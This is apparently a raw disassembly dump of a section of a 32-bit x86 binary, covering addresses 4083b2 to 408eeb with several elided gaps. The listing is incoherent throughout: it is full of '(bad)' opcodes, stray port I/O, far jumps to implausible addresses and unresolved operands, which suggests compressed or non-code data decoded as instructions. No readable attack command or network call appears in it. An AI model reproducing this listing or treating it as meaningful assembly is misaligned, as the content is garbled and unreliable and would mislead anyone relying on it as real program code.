  4083b2:	call   FWORD PTR [edx+edi*2]
  4083b5:	cmp    DWORD PTR [edi-0x14ce3d52],esp
  4083bb:	in     eax,0x47
  4083bd:	pop    ebx
  4083be:	push   0xffffffe9
  4083c0:	mov    dl,0xa7
  4083c2:	or     BYTE PTR [eax],al
  4083c4:	scas   eax,DWORD PTR es:[edi]
  4083c5:	mov    ds:0xded0ffcf,eax
  4083ca:	mov    ah,0x54
  4083cc:	rcr    dh,1
  4083ce:	(bad)  
  4083cf:	call   0x3f6f73
  4083d4:	mov    al,ds:0x90ff5c89
  4083d9:	(bad)  
  4083db:	mov    ebp,0x2bfedf65
	...
  408408:	add    BYTE PTR [eax],al
  40840a:	ins    BYTE PTR es:[edi],dx
  40840b:	push   esp
  40840c:	dec    edx
  40840d:	push   eax
  40840e:	out    0x5c,al
  408410:	call   0x9d1550
  408415:	mov    DWORD PTR [edx+0x50fffe10],ebx
  40841b:	fstp   TBYTE PTR [esp+ebp*1+0xfedf20]
  408422:	retf   
  408423:	ds cmps DWORD PTR ss:[si],DWORD PTR es:[di]
  408427:	popf   
  408428:	add    bh,bh
  40842a:	mov    dl,BYTE PTR [eax]
  40842c:	(bad)  
  40842d:	inc    DWORD PTR [eax-0x2c]
  408430:	mov    ebx,0xb5ce7bd
  408435:	ror    BYTE PTR [ebx+0x32],0x8c
  408439:	xchg   ebp,eax
  40843a:	xchg   edi,ebx
  40843c:	(bad)  
  40843d:	push   DWORD PTR [ebp-0x1c]
  408440:	iret   
  408441:	inc    ebx
  408442:	lods   al,BYTE PTR ds:[esi]
  408443:	add    DWORD PTR [ebp+0xc],esi
  408446:	and    bl,dl
  408448:	das    
  408449:	push   DWORD PTR [eax-0x1c]
  40844c:	dec    edi
  40844d:	call   0x4126c9
  408452:	in     eax,dx
  408453:	cmp    cl,BYTE PTR [ebp+eax*4-0x11a79]
  40845a:	daa    
  40845b:	in     al,0x74
  40845d:	or     bh,cl
  40845f:	jno    0x408430
  408461:	call   eax
  408463:	in     al,0x74
  408465:	cld    
  408466:	ds leave 
  408468:	adc    BYTE PTR [eax],cl
  40846a:	push   esi
  40846b:	call   0x41842a
	...
  408498:	pop    ecx
  408499:	jns    0x4084ca
  40849b:	leave  
  40849c:	jl     0x4084d4
  40849e:	add    edx,DWORD PTR [ebp-0x4b]
  4084a1:	(bad)  
  4084a2:	test   ah,al
  4084a4:	push   esi
  4084a5:	test   eax,0xfecbff8b
  4084aa:	xchg   BYTE PTR [eax+0x31],dl
  4084ad:	pop    es
  4084ae:	idiv   esi
  4084b0:	jae    0x408521
  4084b2:	cmp    al,0x41
  4084b4:	ds call 0xbffe:0x423ebe1d
  4084bc:	inc    ecx
  4084bd:	mov    bh,0xa3
  4084bf:	add    BYTE PTR [esi],bh
  4084c1:	inc    edx
  4084c2:	ret    0x645
  4084c5:	inc    edx
  4084c6:	add    eax,DWORD PTR [eax]
  4084c8:	add    DWORD PTR ds:[ecx-0xc],0x338f1
  4084d0:	push   esp
  4084d1:	inc    edx
  4084d2:	sbb    eax,0x98b6b300
  4084d7:	neg    ecx
  4084d9:	pop    eax
  4084da:	xor    al,0x6a
  4084dc:	ds mov edi,0xb76ef441
  4084e2:	xor    esp,0x508a40c9
  4084e8:	mov    ecx,0x2bff8c8e
  4084ed:	push   cs
  4084ee:	fwait
  4084ef:	push   esp
  4084f0:	call   0x7e4b8836
  4084f5:	test   DWORD PTR [ecx],eax
  4084f7:	jmp    0x43c6df
	...
  408524:	add    BYTE PTR [eax],al
  408526:	mov    ebp,0x89f797ae
  40852b:	call   0xc570f933
  408530:	dec    eax
  408531:	in     al,dx
  408532:	jno    0x40858e
  408534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408535:	mov    bh,BYTE PTR [ecx]
  408537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408538:	in     al,0x8a
  40853a:	add    esi,DWORD PTR [ebx]
  40853c:	adc    BYTE PTR [ecx-0x2a],0xb6
  408540:	cmp    BYTE PTR [ebp+0x3e],al
  408543:	fisubr WORD PTR [ebx-0x71]
  408546:	dec    ecx
  408547:	das    
  408548:	jle    0x40857d
  40854a:	push   esi
  40854b:	cdq    
  40854c:	aaa    
  40854d:	add    edi,DWORD PTR [esi]
  40854f:	fs test eax,0x6be0af0f
  408555:	fwait
  408556:	sub    DWORD PTR [edi],ebp
  408558:	pop    esi
  408559:	xor    edi,DWORD PTR [ebx+0x21925cd8]
  40855f:	das    
  408560:	mov    ecx,0x465f938a
  408565:	shr    dl,1
  408567:	mov    ds:0x191603a8,eax
  40856c:	sbb    eax,0x2963018a
  408571:	jg     0xe9d3f15b
  408577:	cs push ds
  408579:	sbb    edi,DWORD PTR [edi]
  40857b:	pop    ebx
  40857c:	push   es
  40857d:	dec    ecx
  40857e:	loope  0x408528
  408580:	loope  0x40851d
  408582:	sbb    DWORD PTR ds:0xf0bd8a06,0x920c
	...
  4085b4:	leave  
  4085b5:	cs call 0xea01b7cb
  4085bb:	mov    dh,BYTE PTR [ebx]
  4085bd:	arpl   cx,dx
  4085bf:	rol    BYTE PTR [ebx+0x349dde2e],1
  4085c5:	shr    eax,0x88
  4085c8:	sub    esp,DWORD PTR [ebx-0x3f]
  4085cb:	fmul   QWORD PTR [ebx-0x347639d2]
  4085d1:	inc    ebx
  4085d2:	mov    dh,0x89
  4085d4:	mov    DWORD PTR [esi],ebp
  4085d6:	add    BYTE PTR [edx+ebp*4+0x26],bh
  4085da:	jmp    FWORD PTR [esi-0x6ef75739]
  4085e0:	xor    BYTE PTR ds:0xe8b79eff,bl
  4085e6:	out    dx,eax
  4085e7:	sahf   
  4085e8:	mov    bh,0x2e
  4085ea:	call   0xff6f1320
  4085ef:	xchg   BYTE PTR [ecx],dl
  4085f1:	xor    ebp,ecx
  4085f3:	shl    DWORD PTR [esi+0x3176ff2e],1
  4085f9:	das    
  4085fa:	call   0x9c06f4
  4085ff:	xor    al,bh
  408601:	bound  eax,QWORD PTR [eax]
  408603:	mov    ah,0xaa
  408605:	aas    
  408606:	sub    DWORD PTR ds:0x4eff25de,0x99fc9891
  408610:	(bad)  
  408611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408612:	or     al,0x3e
  408614:	stc    
  408615:	push   es
  408616:	dec    eax
  408617:	test   al,0x0
	...
  408641:	add    BYTE PTR ds:0x426c5b43,bh
  408647:	pop    ebx
  408648:	or     ebp,DWORD PTR [ecx]
  40864a:	not    esi
  40864c:	push   edx
  40864d:	call   0xad07e18f
  408652:	mov    ch,0x5a
  408654:	add    cl,ch
  408656:	cmp    eax,0xc6fd4516
  40865b:	push   ebp
  40865c:	add    cl,ch
  40865e:	sub    ebx,DWORD PTR [ebx+0x6a]
  408661:	jmp    0xe9aae189
  408666:	xor    BYTE PTR [eax-0x27d6c60c],bl
  40866c:	repz (bad) 
  40866e:	mov    dh,0x2d
  408670:	push   eax
  408671:	(bad)  
  408672:	xor    BYTE PTR [ebx],dh
  408674:	call   DWORD PTR [esi+eax*8+0x42]
  408678:	sub    eax,0x59ba00
  40867d:	or     edx,edi
  40867f:	pop    ebp
  408680:	add    eax,0x5861e9
  408685:	add    bh,bh
  408687:	mov    DWORD PTR [eax+0x41],ecx
  40868a:	addr16 loop 0x408701
  40868d:	or     al,0xcf
  40868f:	arpl   sp,dx
  408691:	dec    eax
  408693:	imul   ecx,DWORD PTR [ebx-0xb530530],0x4fe2b8f7
  40869d:	push   edx
  40869e:	scas   eax,DWORD PTR es:[edi]
  40869f:	push   ebx
  4086a0:	aam    0xff
  4086a2:	enter  0x85b0,0xf0
	...
  4086ce:	add    BYTE PTR [eax],al
  4086d0:	mov    al,0xe3
  4086d2:	(bad)  
  4086d3:	call   0x3f6f3b
  4086d8:	or     eax,0xe64d6859
  4086dd:	cdq    
  4086de:	add    bh,bh
  4086e0:	mov    dl,0xc8
  4086e2:	idiv   bh
  4086e4:	js     0x4086c9
  4086e6:	xor    al,0xd5
  4086e8:	iret   
  4086e9:	cdq    
  4086ea:	add    al,ch
  4086ec:	push   ebx
  4086ed:	out    0xfe,eax
  4086ef:	call   FWORD PTR [esi-0x53]
  4086f2:	in     al,0xf7
  4086f4:	sbb    bl,ah
  4086f6:	imul   eax,DWORD PTR [eax],0x41516acf
  4086fc:	xlat   BYTE PTR ds:[ebx]
  4086fd:	jecxz  0x4086b3
  4086ff:	lock xor bl,ah
  408702:	(bad)  
  408703:	call   DWORD PTR [edx-0x28beb803]
  408709:	shl    BYTE PTR [ebp-0x772b372d],1
  40870f:	test   DWORD PTR [ebx+0xdfffedc],edi
  408715:	push   edi
  408716:	push   0x96665f
  40871b:	(bad)  
  40871c:	ds iret 
  40871e:	xchg   ebx,eax
  40871f:	neg    DWORD PTR [ecx+0x6b35871d]
  408725:	push   0x45
  408727:	add    BYTE PTR [esi-0x7e004c56],dl
  40872d:	mov    ebx,0xfd71e881
  408732:	xchg   BYTE PTR [ebx+0x0],al
	...
  40875c:	add    BYTE PTR [eax],al
  40875e:	mov    bl,0xde
  408760:	mov    ?,edi
  408762:	imul   eax,DWORD PTR [edx+0xf],0x9887bd49
  408769:	neg    DWORD PTR [ecx-0x23]
  40876c:	add    esi,DWORD PTR [esi+edi*8-0x40]
  408770:	dec    ecx
  408771:	call   0xc834c7
  408776:	retf   0x1aec
  408779:	add    BYTE PTR [esi],bh
  40877b:	lods   eax,DWORD PTR ds:[esi]
  40877c:	inc    esi
  40877d:	jmp    FWORD PTR [ebx-0x50c64d6]
  408783:	mov    WORD PTR [edi-0x706a1401],es
  408789:	call   FWORD PTR [ecx]
  40878b:	popf   
  40878c:	adc    DWORD PTR [eax],ecx
  40878e:	es std 
  408790:	mov    bh,0xff
  408792:	or     DWORD PTR [ebp+0x51],ebp
  408795:	call   0xffc7eca3
  40879a:	jae    0x4087d6
  40879c:	fwait
  40879d:	cmp    DWORD PTR [ebx],eax
  40879f:	jne    0x408728
  4087a1:	push   DWORD PTR [ebx-0x1e0070ab]
  4087a7:	inc    esp
  4087a8:	adc    DWORD PTR [eax],ecx
  4087aa:	out    0x18,al
  4087ac:	mov    eax,0x5154d1ff
  4087b1:	in     al,0xd1
  4087b3:	sub    al,0x86
  4087b5:	call   0xffc7d9ed
  4087ba:	mov    ecx,0xb1f79866
  4087bf:	pop    edx
  4087c0:	out    0x9b,al
	...
  4087ea:	add    BYTE PTR [eax],al
  4087ec:	cmp    al,0xb
  4087ee:	fiadd  WORD PTR [esi-0x713f1a5f]
  4087f4:	cdq    
  4087f5:	sub    eax,ecx
  4087f7:	mov    es,WORD PTR [ecx-0x2c7939d5]
  4087fd:	sub    dh,BYTE PTR [esi+0x3c2b8186]
  408803:	cld    
  408804:	popa   
  408805:	cmc    
  408806:	scas   al,BYTE PTR es:[edi]
  408807:	xchg   BYTE PTR [ecx+0x2b],dh
  40880a:	pop    esp
  40880b:	xchg   ebx,eax
  40880c:	jno    0x408839
  40880e:	sahf   
  40880f:	fwait
  408810:	sbb    BYTE PTR [ebx],0x96
  408813:	xchg   BYTE PTR [ecx-0x6b],bl
  408816:	xchg   ecx,eax
  408817:	pushf  
  408818:	xchg   edx,eax
  408819:	sub    al,0x86
  40881b:	xchg   BYTE PTR [ecx-0x5b],cl
  40881e:	jge    0x4087bb
  408820:	inc    esp
  408821:	out    dx,eax
  408822:	call   0xe15e8f2a
  408827:	add    ecx,DWORD PTR [ebx+0x28254d6]
  40882d:	sub    bl,dl
  40882f:	add    edx,DWORD PTR [esp+ebx*2+0x33461056]
  408836:	pop    ecx
  408837:	mov    bh,0x11
  408839:	sub    esi,DWORD PTR [eax+0x40]
  40883c:	or     dh,BYTE PTR [edi+eax*8+0x365b7f33]
  408843:	adc    BYTE PTR [esi+0x33],al
  408846:	lds    eax,FWORD PTR [ebp-0x7f6ed50f]
  40884c:	mov    ds,WORD PTR [ecx+ebp*8+0x86]
	...
  408877:	add    BYTE PTR [eax],al
  408879:	add    BYTE PTR [ebx+0x53],ch
  40887c:	add    DWORD PTR [esi],ebp
  40887e:	fsubr  DWORD PTR [edx]
  408880:	push   cs
  408881:	sbb    ebx,DWORD PTR [ebx-0x36fc5775]
  408887:	mov    al,0xf1
  408889:	fwait
  40888a:	je     0x4088b5
  40888c:	add    dh,dh
  40888e:	ret    
  40888f:	mov    bl,0xcc
  408891:	cdq    
  408892:	cli    
  408893:	pop    edx
  408894:	call   FWORD PTR [edx+ebp*4+0x42]
  408898:	das    
  408899:	fdivr  QWORD PTR [ebx+0x52dd682a]
  40889f:	pushf  
  4088a0:	add    dh,cl
  4088a2:	inc    ecx
  4088a3:	push   ebx
  4088a4:	call   0xff6b49b4
  4088a9:	push   ecx
  4088aa:	cdq    
  4088ab:	mov    eax,DWORD PTR [ecx-0x17]
  4088ae:	ret    0x8b0
  4088b1:	shl    DWORD PTR [ecx+0x27],0xff
  4088b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b6:	ret    
  4088b7:	mov    al,0xfc
  4088b9:	sahf   
  4088ba:	xor    DWORD PTR [ebx-0x18],edx
  4088bd:	mov    bl,0x96
  4088bf:	sub    bh,bh
  4088c1:	mov    al,ds:0x1c005f7c
  4088c6:	(bad)  
  4088c7:	ss push 0xbe3a3de9
  4088cd:	jbe    0x408918
  4088cf:	push   edi
  4088d0:	push   esp
  4088d2:	xor    eax,0xc35c5242
  4088d7:	sub    ecx,ecx
  4088d9:	sub    esp,DWORD PTR [edx]
  4088db:	sub    dl,BYTE PTR [edx+eiz*2+0x0]
	...
  408907:	add    BYTE PTR [esi+0x3ddd7cdd],dh
  40890d:	pop    edx
  40890e:	test   BYTE PTR [ebx],cl
  408910:	cmp    eax,0x313e005b
  408915:	push   edi
  408916:	call   0xff6a30d0
  40891b:	loop   0x40891a
  40891d:	scas   eax,DWORD PTR es:[edi]
  40891e:	adc    BYTE PTR [ecx-0x16be6c74],dl
  408924:	mov    edx,0xd0010caf
  408929:	or     al,0xff
  40892b:	push   cs
  40892c:	push   ebp
  40892d:	mov    al,ds:0x5dad000c
  408932:	push   0x9ca689
  408937:	push   0x416e1b
  40893c:	mov    al,ds:0x5648d418
  408941:	pop    edi
  408942:	call   0xff1f6e60
  408947:	or     esp,edi
  408949:	pop    ecx
  40894a:	push   ds
  40894b:	push   eax
  40894c:	push   edi
  40894d:	loopne 0x4089c3
  40894f:	or     al,0x6f
  408951:	stos   DWORD PTR es:[edi],eax
  408952:	sar    bh,cl
  408954:	shr    BYTE PTR [ebp+0x50],0xff
  408958:	cmp    ah,BYTE PTR [edi]
  40895a:	out    0x91,eax
  40895c:	mov    al,ds:0xbbe8fede
  408961:	out    dx,eax
  408962:	(bad)  
  408963:	dec    edi
  408965:	dec    ch
  408967:	push   DWORD PTR [eax+0x680043]
	...
  408995:	add    dh,bl
  408997:	ins    BYTE PTR es:[edi],dx
  408998:	inc    ecx
  408999:	add    BYTE PTR [edi],ch
  40899b:	stos   DWORD PTR es:[edi],eax
  40899c:	push   ecx
  40899d:	inc    ecx
  40899e:	push   edi
  40899f:	inc    ebp
  4089a0:	add    al,BYTE PTR [eax]
  4089a2:	daa    
  4089a3:	fucom  st(7)
  4089a5:	loope  0x40897d
  4089a7:	(bad)  
  4089a9:	or     edx,DWORD PTR [edi+0x58]
  4089ac:	push   ds
  4089ad:	push   eax
  4089ae:	out    0xdf,eax
  4089b0:	je     0x4089be
  4089b2:	jg     0x408a26
  4089b4:	sar    bh,cl
  4089b6:	sub    BYTE PTR [eax+edx*2-0x1],0xca
  4089bb:	and    al,0xe7
  4089bd:	pop    ecx
  4089be:	inc    eax
  4089bf:	(bad)  
  4089c1:	call   0x3f7889
  4089c6:	jg     0x40894f
  4089c8:	into   
  4089c9:	jmp    DWORD PTR [eax]
  4089cb:	inc    edx
  4089cc:	add    BYTE PTR [eax+0x6e],ch
  4089cf:	ins    DWORD PTR es:[edi],dx
  4089d0:	inc    ecx
  4089d1:	add    BYTE PTR [esi],bh
  4089d3:	fimul  DWORD PTR [ebx+0x51]
  4089d6:	jg     0x408a0a
  4089d8:	test   BYTE PTR ds:0x41eaf3,dh
  4089de:	(bad)  
  4089df:	mov    dh,BYTE PTR [edx-0x3cc24601]
  4089e5:	je     0x408a37
  4089e7:	ret    0xff32
  4089ea:	xor    ebp,DWORD PTR [esi]
  4089ec:	imul   esp,DWORD PTR [ecx],0xffffff8c
  4089ef:	or     DWORD PTR [ebx-0x6ef11b0],eax
  4089f5:	pop    es
  4089f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089f7:	push   edx
  4089f8:	cmp    edi,0x0
	...
  408a23:	add    BYTE PTR [ecx-0x7e3208f6],cl
  408a29:	jmp    0xf1c8f899
  408a2e:	sub    BYTE PTR [edx+0x3e],0x9a
  408a32:	lea    edx,[ecx-0x1]
  408a35:	xor    ebx,ebp
  408a37:	mov    dh,0xf
  408a39:	jae    0x408a3f
  408a3b:	push   0x8003323c
  408a40:	inc    dx
  408a42:	push   ebp
  408a43:	dec    DWORD PTR [ecx+0x2d]
  408a46:	inc    ebx
  408a47:	je     0x408a69
  408a49:	inc    edx
  408a4a:	aam    0xfe
  408a4c:	mov    bl,0x3e
  408a4e:	imul   ebp,ecx,0xf
  408a51:	mov    ecx,0xc18e5083
  408a56:	stc    
  408a57:	pop    es
  408a58:	push   ss
  408a59:	mov    al,BYTE PTR [edx+0x3f9a19ff]
  408a5f:	into   
  408a60:	adc    DWORD PTR [ecx-0x5f07c994],ebx
  408a66:	sub    DWORD PTR [eax-0x69],0xffffffc3
  408a6a:	ret    
  408a6b:	(bad)  
  408a6c:	clc    
  408a6d:	out    0xe,al
  408a6f:	call   0xffc3cd7a
  408a74:	mov    ds,WORD PTR [ebx-0x47]
  408a77:	sub    BYTE PTR [ebx+0x53],0x11
  408a7b:	dec    ebx
  408a7c:	fsub   DWORD PTR [edi]
  408a7e:	push   ss
  408a7f:	ins    BYTE PTR es:[edi],dx
  408a80:	xor    al,0x19
  408a82:	push   cs
  408a83:	or     ecx,0xffffffad
  408a86:	cmc    
  408a87:	imul   eax,DWORD PTR [eax],0x0
	...
  408ab2:	sub    al,0x19
  408ab4:	inc    BYTE PTR [edx+0x3e11c87]
  408aba:	or     edx,esp
  408abc:	cld    
  408abd:	xchg   BYTE PTR [edx+0x1404532e],al
  408ac3:	pop    ebp
  408ac4:	fdivp  st(0),st
  408ac6:	inc    ecx
  408ac7:	xor    ebx,DWORD PTR ds:0x6027914f
  408acd:	enter  0xb285,0xec
  408ad1:	add    al,0x3e
  408ad3:	pop    ebx
  408ad4:	ror    DWORD PTR [ecx],1
  408ad6:	mov    BYTE PTR [edi],ah
  408ad8:	mov    dh,0x8c
  408ada:	sti    
  408adb:	and    al,BYTE PTR [ecx+0x8]
  408ade:	aas    
  408adf:	pop    ebx
  408ae0:	jmp    0x91637667
  408ae5:	test   BYTE PTR [edi+0x7e0ee95a],dl
  408aeb:	scas   al,BYTE PTR es:[edi]
  408aec:	cmc    
  408aed:	inc    eax
  408aee:	inc    edx
  408aef:	pop    edx
  408af0:	jmp    0x7e9653f8
  408af5:	clc    
  408af6:	xor    DWORD PTR [edi],esp
  408af8:	cld    
  408af9:	or     esp,DWORD PTR [esi]
  408afb:	aam    0x6e
  408afd:	sub    BYTE PTR [ecx],0x33
  408b00:	icebp  
  408b01:	sub    BYTE PTR [ebx+0xbc25123],0x27
  408b08:	push   esi
  408b09:	in     eax,dx
  408b0a:	pop    ecx
  408b0b:	xor    edi,ecx
  408b0d:	push   ebp
  408b0e:	or     DWORD PTR [edi],esp
  408b10:	cdq    
  408b11:	or     BYTE PTR [ebx+0xf15153],0x0
	...
  408b40:	sti    
  408b41:	add    BYTE PTR es:[esi],dh
  408b44:	jecxz  0x408b8a
  408b46:	call   0xff671f34
  408b4b:	bnd jge 0x408afd
  408b4e:	adc    al,0x91
  408b50:	(bad)  
  408b51:	mov    eax,DWORD PTR [ecx-0x17]
  408b54:	in     eax,dx
  408b55:	mov    WORD PTR ds:[eax],?
  408b58:	mov    esp,0xc6065026
  408b5d:	pop    esi
  408b5e:	call   0xff674b11
  408b63:	sbb    DWORD PTR [eax+0x33],0xffffffe1
  408b67:	sbb    BYTE PTR [esi+eiz*1+0x4aa6a90b],bh
  408b6e:	push   0x9b6d54
  408b73:	cmp    DWORD PTR [edx],esp
  408b75:	mov    eax,0x8bbfced1
  408b7a:	(bad)  
  408b7b:	cmp    al,0x32
  408b7d:	xor    esi,DWORD PTR [eax]
  408b7f:	mov    edi,0xd56a26bf
  408b84:	in     eax,0x18
  408b86:	shr    DWORD PTR [esi+0x1dc052bf],1
  408b8c:	inc    esi
  408b8d:	mov    bl,0x75
  408b8f:	cmp    BYTE PTR [ebp+0x26],bh
  408b92:	dec    edi
  408b93:	sub    DWORD PTR [ebx+ecx*1-0x1],0x7525728e
  408b9b:	icebp  
  408b9c:	aad    0x4b
  408b9e:	(bad)  
  408b9f:	jle    0x408b60
  408ba1:	mov    al,0x0
  408ba3:	add    DWORD PTR [eax],eax
	...
  408bcd:	add    BYTE PTR [esp+ecx*4],bh
  408bd0:	inc    ecx
  408bd1:	jmp    0xa89155eb
  408bd6:	cmp    eax,0xa343526
  408bdb:	fwait
  408bdc:	add    BYTE PTR [ecx-0x15],al
  408bdf:	adc    eax,0x24f24eff
  408be4:	jne    0x408be6
  408be6:	(bad)  
  408be8:	icebp  
  408be9:	std    
  408bea:	cmp    ah,bl
  408bec:	imul   eax,DWORD PTR [eax],0x4150d0ff
  408bf2:	xlat   BYTE PTR ds:[ebx]
  408bf3:	xor    DWORD PTR [ebx-0xa669af],edx
  408bf9:	xor    eax,0x401712
  408bfe:	aas    
  408bff:	jo     0x408bd1
  408c01:	(bad)  
  408c02:	cmp    BYTE PTR [eax-0x40],bl
  408c05:	je     0x408be8
  408c07:	rol    BYTE PTR [esp+esi*8-0x48],1
  408c0b:	sub    al,0xf3
  408c0d:	push   DWORD PTR [edx]
  408c0f:	push   edx
  408c10:	call   0xff1b26c6
  408c15:	inc    DWORD PTR [edx]
  408c17:	mov    ds:0xdaea01e8,eax
  408c1c:	(bad)  
  408c1d:	push   0xffffffa7
  408c1f:	xor    DWORD PTR [ebp+0x51],edi
  408c22:	push   esi
  408c23:	pop    edi
  408c24:	push   0xff1a26b7
  408c29:	(bad)  
  408c2a:	jb     0x408bb8
  408c2c:	dec    eax
  408c2d:	inc    ecx
  408c2e:	addr16 mov cl,0x2
  408c31:	rol    BYTE PTR [eax],1
	...
  408c5b:	add    BYTE PTR [eax+0x42ff4fda],bl
  408c61:	push   edi
  408c62:	call   0xff1b4707
  408c67:	push   0x67
  408c69:	xor    DWORD PTR [eax+0x685f1651],ecx
  408c6f:	mov    bh,0x26
  408c71:	sbb    bh,bh
  408c73:	(bad)  
  408c74:	repnz lea ecx,[eax+0x41]
  408c78:	daa    
  408c79:	mov    cl,0xe2
  408c7b:	iret   
  408c7c:	cwde   
  408c7d:	fisttp DWORD PTR [edx]
  408c7f:	rol    BYTE PTR [ebx],0x43
  408c82:	mov    DWORD PTR [ebp+0x73],eax
  408c85:	(bad)  [esp+esi*8+0x3e]
  408c89:	(bad)  
  408c8a:	test   BYTE PTR [edi],0x16
  408c8d:	adc    edi,DWORD PTR [esi-0x1]
  408c90:	add    DWORD PTR [esi-0x5d190c0a],ebx
  408c96:	dec    edi
  408c97:	push   ecx
  408c99:	sbb    BYTE PTR [ebx],al
  408c9b:	push   0xffc1c368
  408ca0:	pop    ecx
  408ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca2:	rol    BYTE PTR [eax+0x3e],cl
  408ca5:	retf   0x4
  408ca8:	ds mov dl,0x6b
  408cab:	mov    dl,0xf9
  408cad:	push   ebp
  408cae:	adc    BYTE PTR [eax-0x3f],0xa7
  408cb2:	or     ebp,eax
  408cb4:	push   cs
  408cb5:	daa    
  408cb6:	jg     0x408cb7
  408cb8:	and    al,0x32
  408cba:	jmp    0x408c44
  408cbc:	psllq  mm0,QWORD PTR [edx]
  408cbf:	push   0x0
	...
  408ce8:	add    BYTE PTR [eax],al
  408cea:	retf   0xc563
  408ced:	jmp    DWORD PTR [ecx]
  408cef:	xor    BYTE PTR [ebx],al
  408cf1:	add    BYTE PTR [esi-0x76306ce6],bh
  408cf7:	adc    eax,0x40ac00b
  408cfc:	mov    WORD PTR [ebp+0x72],es
  408cff:	in     eax,0xf8
  408d01:	repz jno 0x408d6b
  408d04:	or     al,0xe8
  408d06:	dec    edi
  408d07:	idiv   DWORD PTR [esi-0x1]
  408d0a:	popa   
  408d0b:	inc    edi
  408d0c:	js     0x408cf6
  408d0e:	fcomip st,st(5)
  408d10:	jle    0x408d11
  408d12:	in     al,0x31
  408d14:	jmp    0x408d93
  408d16:	out    dx,eax
  408d17:	jb     0x408d1d
  408d19:	push   0xffc54389
  408d1e:	mov    eax,ds:0xbe000330
  408d23:	(bad)  
  408d25:	into   
  408d26:	sub    DWORD PTR [ebp+0x5babfed4],esi
  408d2c:	icebp  
  408d2d:	imul   edi,DWORD PTR [edi],0x26
  408d30:	pop    esi
  408d31:	jg     0x408cd7
  408d33:	pop    ebx
  408d34:	ror    DWORD PTR [edi+ebp*2-0x37141666],0x89
  408d3c:	test   al,0x3
  408d3e:	pop    cx
  408d40:	jmp    0xad734b48
  408d45:	dec    esi
  408d46:	jmp    0x6a846f6e
  408d4b:	dec    ebp
  408d4c:	jo     0x408d17
	...
  408d76:	add    BYTE PTR [eax],al
  408d78:	int    0x23
  408d7a:	xchg   esp,eax
  408d7b:	ja     0x408d4e
  408d7d:	lods   eax,DWORD PTR ds:[esi]
  408d7e:	loope  0x408deb
  408d80:	cld    
  408d81:	es push cs
  408d83:	jg     0x408d46
  408d85:	lods   eax,DWORD PTR ds:[esi]
  408d86:	std    
  408d87:	imul   ecx,DWORD PTR [edi+edx*1-0x2],0x7e
  408d8c:	mov    cl,0xad
  408d8e:	cmc    
  408d8f:	jle    0x408dc4
  408d91:	push   ebx
  408d92:	add    DWORD PTR [ecx+0x4ce62377],ecx
  408d98:	jl     0x408df8
  408d9a:	jmp    0x41775277
  408d9f:	add    al,0x3e
  408da1:	xor    al,0x8f
  408da3:	jle    0x408db0
  408da5:	push   edi
  408da6:	xabort 0x41
  408da9:	xor    edi,DWORD PTR [esp+esi*2+0x41a02371]
  408db0:	ss pop ebx
  408db2:	adc    al,0x8b
  408db4:	push   edx
  408db5:	fldcw  WORD PTR [edi+esi*4+0x469e2358]
  408dbc:	mov    ebx,0x497e96e2
  408dc1:	pop    edx
  408dc2:	jmp    0x2c10cbca
  408dc7:	adc    BYTE PTR [ebp+0x1b],al
  408dca:	cmc    
  408dcb:	or     BYTE PTR [esi+0x26e90063],bh
  408dd1:	pop    eax
  408dd2:	jmp    0x9bc8e7
  408dd7:	pushw  ss
  408dd9:	push   edi
  408dda:	call   0x408ed8
	...
  408e03:	add    BYTE PTR [eax],al
  408e05:	add    BYTE PTR [eax+0x22],ch
  408e08:	jmp    edx
  408e0a:	jge    0x408db4
  408e0c:	xadd   DWORD PTR [esi+0x78e94192],eax
  408e13:	test   al,0xc
  408e15:	push   ecx
  408e16:	add    edx,DWORD PTR [edx]
  408e18:	push   DWORD PTR [esi]
  408e1a:	push   esp
  408e1b:	push   eax
  408e1c:	push   0x9bf033
  408e21:	es (bad) 
  408e23:	push   esi
  408e24:	call   0xff630f07
  408e29:	pusha  
  408e2a:	mov    dh,0xe3
  408e2c:	std    
  408e2d:	push   cs
  408e2e:	inc    eax
  408e2f:	mov    bl,0x3e
  408e31:	call   0x64cde973
  408e36:	jmp    DWORD PTR [eax]
  408e38:	push   esi
  408e3a:	mov    WORD PTR [edx],?
  408e3c:	mov    bh,0x22
  408e3e:	and    BYTE PTR [edx],ah
  408e40:	lea    ebp,[esp+edi*8+0x20]
  408e44:	(bad)  
  408e45:	fisubr WORD PTR [edx+0x21]
  408e48:	mov    ch,0x91
  408e4a:	or     BYTE PTR [edx],ah
  408e4c:	inc    ecx
  408e4e:	adc    eax,0xc4e8ffe9
  408e53:	fdivr  DWORD PTR [ebx+0x4021f3bf]
  408e59:	out    0xc1,al
  408e5b:	es add cl,ch
  408e5e:	cmp    eax,0xd8ab94d0
  408e63:	and    edi,edi
  408e65:	xchg   esi,eax
  408e66:	cmp    al,0x4b
  408e68:	add    cl,ch
	...
  408e92:	add    BYTE PTR [eax],al
  408e94:	cmp    eax,0x7c5c65a7
  408e99:	jbe    0x408eeb
  408e9b:	add    BYTE PTR [edi-0x59],cl
  408e9e:	dec    edi
  408e9f:	inc    ecx
  408ea0:	daa    
  408ea1:	mov    dh,0xc6
  408ea3:	mov    dh,0x17
  408ea5:	pop    esi
  408ea6:	or     eax,eax
  408ea8:	sub    bl,BYTE PTR [ecx-0x17]
  408eab:	mov    cl,0x27
  408ead:	pop    esi
  408eae:	add    BYTE PTR [ebp-0x16276],cl
  408eb4:	jo     0x408e88
  408eb6:	inc    ecx
  408eb7:	sub    al,0xc7
  408eb9:	xor    eax,0x5da64ff1
  408ebe:	call   0x97f86c
  408ec3:	or     edx,DWORD PTR [edi]
  408ec5:	sub    al,BYTE PTR [ecx+ebp*8]
  408ec8:	mov    edx,DWORD PTR [edi+0x0]
  408ecb:	add    BYTE PTR [edi-0x18beb814],ch
  408ed1:	sahf   
  408ed2:	jne    0x408ee0
  408ed4:	aas    
  408ed5:	in     eax,0xcd
  408ed7:	push   DWORD PTR [eax]
  408ed9:	rcl    BYTE PTR [edx+eax*8-0x72005fbf],cl
  408ee0:	aad    0x71
  408ee2:	push   edx
  408ee3:	push   eax
  408ee4:	aas    
  408ee5:	mov    eax,ds:0xd90ffce
  408eea:	(bad)  
  408eeb:	jne    0x408e84
